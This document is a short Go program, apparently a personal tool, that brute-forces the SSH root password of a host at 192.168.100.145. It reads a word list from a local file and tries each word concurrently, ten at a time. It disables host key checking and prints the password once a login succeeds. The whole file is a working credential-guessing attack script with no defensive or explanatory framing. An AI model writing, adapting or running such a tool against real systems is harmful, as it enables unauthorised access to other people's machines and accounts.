package main

import (
	"bufio"
	"fmt"
	"golang.org/x/crypto/ssh"

	"os"
	"sync"

	"log"
)

const LIMIT = 10

var done = make(chan bool)

var throttler = make(chan int, LIMIT)

func readFile(f string) (data []string, err error) {
	b, err := os.Open(f)
	if err != nil {
		log.Fatal(err)
	}
	defer b.Close()
	scanner := bufio.NewScanner(b)
	for scanner.Scan() {
		data = append(data, scanner.Text())
	}
	return data, err
}
func connect(wg *sync.WaitGroup, password string) {
	defer wg.Done()
	sshConfig := &ssh.ClientConfig{
		User: "root",
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},

		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
	}
	sshConfig.SetDefaults()
	c, err := ssh.Dial("tcp", "192.168.100.145:22", sshConfig)
	if err != nil {
		<-throttler
		return
	}
	defer c.Close()
	fmt.Printf("Passage granted ! : root password is : %s\n", password)
	done <- true
	<-throttler

}

func main() {
	var wg sync.WaitGroup

	passwords, err := readFile("/home/beriflapp/rootPass/words_alpha.txt")
	if err != nil {
		log.Println("Can't read file!")
		os.Exit(1)
	}

	for _, pass := range passwords {
		select {
		case <-done:
			return
		default:
			throttler <- 0
			wg.Add(1)
			fmt.Println(pass)
			go connect(&wg, pass)
		}

	}
	wg.Wait()

}
